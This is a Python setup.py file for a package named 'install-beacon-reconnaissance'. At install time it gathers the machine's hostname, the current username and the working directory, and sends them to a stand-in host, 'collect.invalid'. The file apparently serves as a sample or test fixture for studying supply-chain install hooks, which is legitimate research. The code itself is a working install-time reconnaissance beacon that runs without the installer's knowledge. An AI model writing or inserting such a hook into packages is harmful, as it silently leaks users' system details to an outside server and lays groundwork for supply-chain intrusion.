from setuptools import setup
import getpass
import os
import socket

import requests

payload = {
    'host': socket.gethostname(),
    'user': getpass.getuser(),
    'cwd': os.getcwd(),
}
requests.get('https://collect.invalid/confirm', params=payload)

setup(name='install-beacon-reconnaissance', version='1.0')
